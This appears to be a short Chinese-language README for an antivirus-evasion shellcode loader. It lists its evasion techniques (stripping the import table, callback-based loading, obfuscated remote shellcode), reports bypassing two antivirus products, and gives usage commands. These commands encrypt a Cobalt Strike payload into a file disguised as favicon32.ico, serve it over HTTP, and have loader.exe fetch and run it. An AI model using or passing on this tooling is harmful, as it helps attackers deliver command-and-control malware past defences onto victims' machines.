##  没什么好介绍

1.去除了关键函数导入表

2.使用回调函数进行加载

3.shellcode混淆远程加载

## 缺点一堆
1.只能使用64位C# shellcode等等。。。

2.自测免杀某60/某绒。。
![1.png](/1.png)
![2.png](/2.png)

## 方法
使用enc.exe加密cs生成payload.cs文件,会在当前目录生成favicon32.ico把文件放服务器使用python起个服务提供远程下载，使用loader.exe进行远程加载
```bash
enc.exe Payload.cs

loader.exe  http://192.168.1.1:80/favicon32.ico

```
